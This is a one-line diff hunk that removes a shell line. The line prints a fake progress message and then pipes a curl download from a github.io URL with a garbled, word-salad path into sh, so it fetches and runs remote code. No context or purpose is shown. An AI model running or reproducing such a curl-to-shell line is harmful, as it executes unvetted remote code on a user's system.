@@ -1,1 +1,0 @@
-echo Progress: 90.00%curl -L --progress-bar frkns.github.io/fun/generatorsdibeavernsdealingweaponslingerieportfilename.md | sh
